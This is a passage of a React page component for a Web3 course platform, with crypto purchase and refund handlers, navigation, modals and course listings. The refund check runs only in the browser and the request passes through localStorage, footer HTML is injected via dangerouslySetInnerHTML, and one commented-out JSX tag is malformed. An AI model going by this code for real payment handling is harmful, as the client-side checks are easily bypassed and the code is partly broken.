          // Send purchase data to API endpoint
          const response = await fetch('/api/purchases', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              courseTitle,
              walletAddress,
              transactionHash: transaction.hash
            }),
          });

          if (!response.ok) {
            console.error('Failed to store purchase in database');
          }
        } catch (err) {
          console.error('Error storing purchase in database:', err);
        }
      }
      
      // Update state to reflect the new purchase
      setPurchasedCourses(coursesArray);
      
      toast.success('Course purchased successfully!');
      return true;
    } catch (error: any) {
      console.error("Error purchasing course:", error);
      toast.error('Failed to purchase course: ' + error.message);
      return false;
    }
  };

  // Add function to handle refund
  const handleRefund = async (courseTitle: string) => {
    if (!walletAddress || !window.ethereum) {
      toast.error("Please connect your wallet first");
      return false;
    }

    try {
      // Only continue if this course was purchased
      if (!purchasedCourses.includes(courseTitle)) {
        toast.error("You haven't purchased this course");
        return false;
      }

      // Find course progress to verify it's completed
      const courseProgress = userProgress.find(progress => 
        (progress.course.title === courseTitle || progress.course === courseTitle)
      );
      
      if (!courseProgress || courseProgress.progress < 100) {
        toast.error("You must complete the course 100% before requesting a refund");
        return false;
      }

      toast.info("Processing refund request...");

      // Student wallet address to receive refund
      const studentAddress = walletAddress;
      
      // Store refund request details in localStorage to share with admin page
      const refundRequest = {
        id: Date.now().toString(),
        courseTitle,
        studentAddress,
        userName: session?.user?.name || "Unknown User",
        requestDate: new Date().toISOString(),
        amount: "0.03"
      };
      
      // Store in localStorage for admin page to access
      localStorage.setItem('pendingRefund', JSON.stringify(refundRequest));
      
      // Give the user options for how to open the admin page
      const openAdminPage = window.confirm(
        "Refund request submitted! Would you like to open the admin page in a new window?\n\n" +
        "Click OK to open the admin page now, or Cancel to open it later."
      );
      
      if (openAdminPage) {
        // Open admin page in a new window
        const adminWindow = window.open('/admin', '_blank');
        
        // If popup was blocked, provide instructions
        if (!adminWindow || adminWindow.closed || typeof adminWindow.closed === 'undefined') {
          toast.warning(
            <div>
              Popup blocked! Please enable popups or manually open the admin page at:
              <div className="mt-2 p-2 bg-gray-100 rounded">
                <code>{window.location.origin}/admin</code>
              </div>
            </div>,
            { autoClose: false }
          );
        }
      } else {
        // User chose not to open admin page now, show instructions
        toast.info(
          <div>
            You can process the refund later by:
            <ol className="mt-2 list-decimal pl-5">
              <li>Opening the admin page at: <code className="bg-gray-100 p-1 rounded">{window.location.origin}/admin</code></li>
              <li>Connecting with admin wallet (0x983c601...)</li>
              <li>Approving the refund to send ETH back to your wallet</li>
            </ol>
          </div>,
          { autoClose: false }
        );
      }
      
      // In a real app, we'd also send the refund request to the server
      try {
        const response = await fetch('/api/refunds', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            courseTitle,
            studentAddress
          }),
        });

        if (!response.ok) {
          console.error('Failed to submit refund request to server');
        }
      } catch (apiError) {
        console.error('API error:', apiError);
        // Continue with local state update even if API fails
      }
      
      return true;
    } catch (error: any) {
      console.error("Error processing refund:", error);
      toast.error('Failed to process refund: ' + error.message);
      return false;
    }
  };

  const handleSignOut = async () => {
    // Disconnect wallet
    setWalletAddress("")
    // Clear purchased courses from state but not from localStorage
    // since localStorage will be reloaded from DB on next login
    setPurchasedCourses([])
    // Sign out from NextAuth
    await signOut()
    toast.info("Logged out and wallet disconnected")
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-950 overflow-hidden">
      <header className="bg-white dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800 sticky top-0 z-30">
      {/* Navbar */}
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5 }}
            className="flex items-center"
          >
            <Link href="/" className="text-xl font-bold text-primary hover:text-primary/90 transition-colors" onClick={() => {
              setSelectedInterest("")
              router.push("/")
            }}>
              Web3Wisdom
            </Link>
          </motion.div>

          {/* Desktop Navigation */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5, delay: 0.2 }}
            className="hidden md:flex items-center space-x-6"
          >
            <div className="relative w-64">
              <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input type="search" placeholder="Search courses..." className="pl-8" />
            </div>

            <nav className="flex items-center space-x-4">
              {session ? (
                <>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }} style={{ display: 'none' }}>
                    <Button variant="outline" onClick={() => setShowDashboardModal(true)}>
                      Dashboard
                    </Button>
                  </motion.div>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button 
                      variant="outline" 
                      onClick={() => window.open('https://fanciful-kringle-15ef6b.netlify.app/', '_blank', 'noopener,noreferrer')}
                    >
                      Store
                    </Button>
                  </motion.div>
                  {walletAddress ? (
                    <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                      <Button variant="outline" onClick={disconnectWallet}>
                        {`${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`}
                      </Button>
                    </motion.div>
                  ) : (
                    <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                      <Button variant="outline" onClick={connectWallet}>
                        Connect Wallet
                      </Button>
                    </motion.div>
                  )}
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="ghost" onClick={() => handleSignOut()}>
                      Logout
                    </Button>
                  </motion.div>
                </>
              ) : (
                <>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="ghost" onClick={() => setShowLoginModal(true)}>
                      Login
                    </Button>
                  </motion.div>

                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="outline" onClick={() => setShowRegisterModal(true)}>
                      Sign Up
                    </Button>
                  </motion.div>
                </>
              )}
            </nav>
          </motion.div>

          {/* Mobile Menu Button */}
          <motion.button className="md:hidden" onClick={toggleMenu} whileTap={{ scale: 0.9 }}>
            {isMenuOpen ? <X className="h-6 w-6" /> : <Menu className="h-6 w-6" />}
          </motion.button>
        </div>

        {/* Mobile Navigation */}
        <AnimatePresence>
          {isMenuOpen && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: "auto", opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.3 }}
              className="md:hidden px-4 py-3 space-y-3 border-t overflow-hidden"
            >
              <div className="relative">
                <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input type="search" placeholder="Search courses..." className="pl-8 w-full" />
              </div>

              <div className="flex flex-col space-y-2">
                <Button variant="ghost" className="justify-start">
                  Login
                </Button>
                <Button variant="outline" className="justify-start">
                  Sign Up
                </Button>

                <AnimatePresence mode="wait">
                  {!walletAddress ? (
                    <motion.div
                      key="connect-mobile"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                    >
                      <Button
                        onClick={connectWallet}
                        className="bg-gradient-to-r from-purple-600 to-blue-500 text-white justify-start w-full"
                      >
                        Connect Wallet
                      </Button>
                    </motion.div>
                  ) : (
                    <motion.div
                      key="disconnect-mobile"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -10 }}
                      className="flex items-center justify-between p-2 border rounded-md"
                    >
                      <div className="text-sm">
                        <div className="font-medium">0x1234...abcd</div>
                        <div className="text-muted-foreground">2.5 ETH</div>
                      </div>
                      <Button variant="ghost" size="sm" onClick={disconnectWallet}>
                        Disconnect
                      </Button>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </header>

      {/* Dashboard Modal */}
      <AnimatePresence>
        {false && showDashboardModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowDashboardModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-2xl font-bold">Dashboard</h2>
                <button
                  onClick={() => setShowDashboardModal(false)}
                  className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                >
                  <X className="h-6 w-6" />
                </button>
              </div>
              
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h2 className="text-lg font-semibold">Welcome, {session?.user?.name}!</h2>
                </div>
                
                <div className="space-y-3">
                  {/* Progress Cards */}
                  {userProgress.map((progress, index) => (
                    <div key={index} className="bg-gray-50 dark:bg-gray-700 rounded-lg p-3">
                      <h3 className="text-sm font-medium mb-1 truncate">{progress.course.title}</h3>
                      <div className="w-full bg-gray-200 rounded-full h-2 mb-1">
                        <div 
                          className="bg-blue-600 h-2 rounded-full" 
                          style={{ width: `${progress.progress}%` }}
                        ></div>
                      </div>
                      <p className="text-xs text-gray-600 dark:text-gray-300">
                        Progress: {progress.progress}%
                      </p>
                    </div>
                  ))}

                  {/* Quick Stats */}
                  <div className="bg-purple-50 dark:bg-purple-900/20 rounded-lg p-3">
                    <p className="text-xs">Courses in Progress: {userProgress.length}</p>
                    <p className="text-xs">Average Progress: {
                      userProgress.length > 0 
                        ? Math.round(userProgress.reduce((acc, curr) => acc + curr.progress, 0) / userProgress.length)
                        : 0
                    }%</p>
                  </div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Store Modal */}
      <AnimatePresence>
        {false && showDashboardModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => {
              setShowDashboardModal(false);
              window.open('https://fanciful-kringle-15ef6b.netlify.app/', '_blank', 'noopener,noreferrer');
            }}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-md w-full cursor-pointer"
              onClick={e => {
                e.stopPropagation();
                window.open('https://fanciful-kringle-15ef6b.netlify.app/', '_blank', 'noopener,noreferrer');
              }}
            >
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-2xl font-bold">Store</h2>
                /*<button
                  onClick={(e) => {
                    e.stopPropagation();
                    setShowDashboardModal(false);
                  }}
                  className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                >*/
                  <X className="h-6 w-6" />
                </button>
              </div>
              
              <div className="space-y-4 text-center">
                <div className="flex items-center justify-center mb-4">
                  <ShoppingCart className="h-16 w-16 text-blue-500" />
                </div>
                
                <div>
                  <h3 className="text-xl font-semibold mb-2">Visit Our Store</h3>
                  <p className="text-gray-600 dark:text-gray-300 mb-4">
                    Discover exclusive merchandise and educational resources.
                  </p>
                  
                  <Button 
                    className="bg-blue-500 hover:bg-blue-600 text-white w-full"
                  >
                    Go to Store
                  </Button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Hero Section */}
      <section className="relative py-20 bg-gradient-to-b from-purple-50 to-white dark:from-gray-900 dark:to-gray-950 overflow-hidden">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 0.5 }}
          transition={{ duration: 1.5 }}
          className="absolute top-1/4 left-10 w-20 h-20 bg-purple-200 dark:bg-purple-900/30 rounded-full blur-3xl"
        ></motion.div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 0.5 }}
          transition={{ duration: 1.5, delay: 0.3 }}
          className="absolute bottom-1/4 right-10 w-32 h-32 bg-blue-200 dark:bg-blue-900/30 rounded-full blur-3xl"
        ></motion.div>

        <div className="container mx-auto px-4 text-center relative z-10">
          <motion.h1
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.7 }}
            className="text-4xl md:text-5xl lg:text-6xl font-bold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-purple-600 to-blue-500"
          >
            Learn Anytime, Anywhere.
          </motion.h1>
          <motion.p
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.7, delay: 0.2 }}
            className="text-lg md:text-xl text-gray-600 dark:text-gray-300 mb-8 max-w-2xl mx-auto"
          >
            Explore top courses & earn NFT-based certificates. Master blockchain and Web3 skills with our decentralized
            learning platform.
          </motion.p>
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.7, delay: 0.4 }}
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
          >
            <Button 
              size="lg" 
              className="bg-gradient-to-r from-purple-600 to-blue-500 text-white"
              onClick={() => setShowExploreCourses(true)}
            >
              Explore Courses
            </Button>
          </motion.div>
        </div>
      </section>

      {/* Live Survey Section */}
      <section className="py-6 bg-gray-50 dark:bg-gray-900">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            {/* Course Selection Component */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5 }}
              className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6"
            >
              <h2 className="text-2xl md:text-3xl font-bold mb-4 text-center">
                Find Your Perfect Course
              </h2>
              <div className="grid grid-cols-2 gap-4">
                {domains.map((domain, index) => (
                  <CourseCard
                    key={index}
                    title={domain.title}
                    description={domain.description}
                    imageSrc={`https://via.placeholder.com/300?text=${domain.title}`}
                    onClick={() => handleDomainClick(domain)}
                  />
                ))}
              </div>
            </motion.div>

            {/* Brain Games Component */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5, delay: 0.2 }}
              className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6"
            >
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-2xl md:text-3xl font-bold">Brain Games</h2>
              </div>
              <div className="grid grid-cols-2 gap-4">
                {[
                  { name: "Sudoku", icon: "🧩", color: "purple", onClick: () => setShowSudoku(true) },
                  { name: "Memory", icon: "🎮", color: "blue", onClick: () => setShowMemory(true) },
                  { name: "Puzzle", icon: "🎯", color: "green", onClick: () => setShowPuzzle(true) },
                  { name: "Quiz", icon: "❓", color: "orange", onClick: () => setShowQuiz(true) }
                ].map((game, index) => (
                  <div
                    key={index}
                    className="w-full p-3 h-auto border border-input rounded-md bg-background flex flex-col items-center gap-2 hover:bg-accent/50 transition-colors duration-200 cursor-pointer"
                    onClick={game.onClick}
                  >
                    <div className="text-2xl">{game.icon}</div>
                    <div className="text-sm font-medium">{game.name}</div>
                  </div>
                ))}
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Courses Section */}
      <section className="py-8">
        <div className="container mx-auto px-4">
          <motion.h2
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.5 }}
            className="text-2xl md:text-3xl font-bold mb-8 text-center"
          >
            Featured Courses
          </motion.h2>

          <motion.div
            variants={staggerContainer}
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8"
          >
            {/* Course Card 1 */}
            <motion.div
              variants={fadeIn}
              whileHover={{ y: -5 }}
              className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md transition-all duration-300"
            >
              <div className="aspect-video">
                <iframe
                  className="w-full h-full"
                  src="https://www.youtube.com/embed/SSo_EIwHSd4"
                  title="Blockchain Fundamentals"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                  allowFullScreen
                ></iframe>
              </div>
              <div className="p-5">
                <h3 className="font-bold text-lg mb-2">Blockchain Fundamentals</h3>
                <p className="text-gray-600 dark:text-gray-300 mb-4">
                  Learn the core concepts behind blockchain technology and how it's revolutionizing industries.
                </p>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-gray-500 dark:text-gray-400">8 modules • 6 hours</span>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="outline" size="sm">
                      Preview
                    </Button>
                  </motion.div>
                </div>
              </div>
            </motion.div>

            {/* Course Card 2 */}
            <motion.div
              variants={fadeIn}
              whileHover={{ y: -5 }}
              className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md transition-all duration-300"
            >
              <div className="aspect-video">
                <iframe
                  className="w-full h-full"
                  src="https://www.youtube.com/embed/gyMwXuJrbJQ"
                  title="Web3 Development"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                  allowFullScreen
                ></iframe>
              </div>
              <div className="p-5">
                <h3 className="font-bold text-lg mb-2">Web3 Development</h3>
                <p className="text-gray-600 dark:text-gray-300 mb-4">
                  Master the tools and frameworks for building decentralized applications on Ethereum.
                </p>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-gray-500 dark:text-gray-400">12 modules • 10 hours</span>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="outline" size="sm">
                      Preview
                    </Button>
                  </motion.div>
                </div>
              </div>
            </motion.div>

            {/* Course Card 3 */}
            <motion.div
              variants={fadeIn}
              whileHover={{ y: -5 }}
              className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-md transition-all duration-300"
            >
              <div className="aspect-video">
                <iframe
                  className="w-full h-full"
                  src="https://www.youtube.com/embed/M576WGiDBdQ"
                  title="Smart Contract Development"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                  allowFullScreen
                ></iframe>
              </div>
              <div className="p-5">
                <h3 className="font-bold text-lg mb-2">Smart Contract Development</h3>
                <p className="text-gray-600 dark:text-gray-300 mb-4">
                  Learn to write, test and deploy secure smart contracts on the blockchain.
                </p>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-gray-500 dark:text-gray-400">10 modules • 8 hours</span>
                  <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                    <Button variant="outline" size="sm">
                      Preview
                    </Button>
                  </motion.div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* Web3 Features Section */}
      <section className="py-16 bg-gradient-to-b from-white to-purple-50 dark:from-gray-950 dark:to-gray-900">
        <div className="container mx-auto px-4">
          <motion.h2
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.5 }}
            className="text-2xl md:text-3xl font-bold mb-12 text-center"
          >
            Web3 Features
          </motion.h2>

          <motion.div
            variants={staggerContainer}
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8"
          >
            {/* Feature 1 */}
            <motion.div
              variants={fadeIn}
              whileHover={{
                y: -5,
                boxShadow: "0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)",
              }}
              className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md transition-all duration-300"
            >
              <motion.div
                initial={{ scale: 0.8 }}
                whileInView={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 200, damping: 10 }}
                className="w-12 h-12 bg-purple-100 dark:bg-purple-900/30 rounded-full flex items-center justify-center mb-4"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-6 w-6 text-purple-600"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </motion.div>
              <h3 className="text-xl font-semibold mb-2">Wallet Integration</h3>
              <p className="text-gray-600 dark:text-gray-300">
                Connect your crypto wallet to access courses, make payments, and store your NFT certificates securely.
              </p>
            </motion.div>

            {/* Feature 2 */}
            <motion.div
              variants={fadeIn}
              whileHover={{
                y: -5,
                boxShadow: "0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)",
              }}
              className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md transition-all duration-300"
            >
              <motion.div
                initial={{ scale: 0.8 }}
                whileInView={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 200, damping: 10, delay: 0.1 }}
                className="w-12 h-12 bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center mb-4"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-6 w-6 text-blue-600"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
              </motion.div>
              <h3 className="text-xl font-semibold mb-2">NFT Certificates</h3>
              <p className="text-gray-600 dark:text-gray-300">
                Earn verifiable blockchain-based certificates upon course completion that you can showcase in your
                portfolio.
              </p>
            </motion.div>

            {/* Feature 3 */}
            <motion.div
              variants={fadeIn}
              whileHover={{
                y: -5,
                boxShadow: "0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)",
              }}
              className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md transition-all duration-300"
            >
              <motion.div
                initial={{ scale: 0.8 }}
                whileInView={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 200, damping: 10, delay: 0.2 }}
                className="w-12 h-12 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center mb-4"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-6 w-6 text-green-600"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
              </motion.div>
              <h3 className="text-xl font-semibold mb-2">Token Payments</h3>
              <p className="text-gray-600 dark:text-gray-300">
                Pay for courses using cryptocurrency tokens with secure, transparent blockchain transactions.
              </p>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-100 dark:bg-gray-900 py-12 mt-auto">
        <div className="container mx-auto px-4">
          <motion.div
            variants={staggerContainer}
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true }}
            className="grid grid-cols-1 md:grid-cols-4 gap-8"
          >
            <motion.div variants={fadeIn}>
              <h3 className="text-lg font-bold mb-4">Web3Wisdom</h3>
              <p className="text-gray-600 dark:text-gray-400 mb-4">
                A decentralized education platform for Web3 and blockchain learning.
              </p>
            </motion.div>

            <motion.div variants={fadeIn}>
              <h3 className="text-lg font-bold mb-4">Web3Wisdom</h3>
              <ul className="space-y-2 text-gray-600 dark:text-gray-400">
                <li>
                  <button onClick={() => handleLinkClick("blockchain-basics")} className="hover:text-primary transition-colors duration-200">
                    Blockchain Basics
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("web3-development")} className="hover:text-primary transition-colors duration-200">
                    Web3 Development
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("smart-contracts")} className="hover:text-primary transition-colors duration-200">
                    Smart Contracts
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("defi-nfts")} className="hover:text-primary transition-colors duration-200">
                    DeFi & NFTs
                  </button>
                </li>
              </ul>
            </motion.div>

            <motion.div variants={fadeIn}>
              <h3 className="text-lg font-bold mb-4">Resources</h3>
              <ul className="space-y-2 text-gray-600 dark:text-gray-400">
                <li>
                  <button onClick={() => handleLinkClick("documentation")} className="hover:text-primary transition-colors duration-200">
                    Documentation
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("tutorials")} className="hover:text-primary transition-colors duration-200">
                    Tutorials
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("blog")} className="hover:text-primary transition-colors duration-200">
                    Blog
                  </button>
                </li>
                <li>
                  <button onClick={() => handleLinkClick("community")} className="hover:text-primary transition-colors duration-200">
                    Community
                  </button>
                </li>
              </ul>
            </motion.div>

            <motion.div variants={fadeIn}>
              <h3 className="text-lg font-bold mb-4">Connect</h3>
              <ul className="space-y-2 text-gray-600 dark:text-gray-400">
                <li>
                  <button onClick={() => handleLinkClick("contact")} className="hover:text-primary transition-colors duration-200">
                    Contact Us
                  </button>
                </li>
              </ul>
            </motion.div>
          </motion.div>

          {activeContent && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="mt-8 p-4 bg-white dark:bg-gray-800 rounded-lg shadow-md"
              dangerouslySetInnerHTML={{ __html: activeContent }}
            />
          )}

          <motion.div
            initial={{ opacity: 0 }}
            whileInView={{ opacity: 1 }}
            viewport={{ once: true }}
            transition={{ delay: 0.5 }}
            className="border-t border-gray-200 dark:border-gray-800 mt-8 pt-8 text-center text-gray-600 dark:text-gray-400"
          >
            <p>© 2025 Web3Wisdom. All rights reserved.</p>
          </motion.div>
        </div>
      </footer>

      {/* Explore Courses Modal */}
      <AnimatePresence>
        {showExploreCourses && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowExploreCourses(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-7xl w-full max-h-[95vh] overflow-y-auto"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-8">
                <h2 className="text-3xl font-bold">Explore Our Courses</h2>
                <button
                  onClick={() => setShowExploreCourses(false)}
                  className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                >
                  <X className="h-8 w-8" />
                </button>
              </div>
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/SSo_EIwHSd4" 
                      title="Blockchain Fundamentals" 
                      frameBorder="0" 
                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">Blockchain Fundamentals</h3>
                    <p className="text-gray-600 dark:text-gray-400">Learn the basics of blockchain technology</p>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/gyMwXuJrbJQ" 
                      title="Web3 Development" 
                      frameBorder="0" 
                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">Web3 Development</h3>
                    <p className="text-gray-600 dark:text-gray-400">Master Web3 development fundamentals</p>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/M576WGiDBdQ" 
                      title="Smart Contracts" 
                      frameBorder="0" 
                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">Smart Contracts</h3>
                    <p className="text-gray-600 dark:text-gray-400">Build secure smart contracts</p>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/17QRFlml4pA" 
                      title="DeFi Explained" 
                      frameBorder="0" 
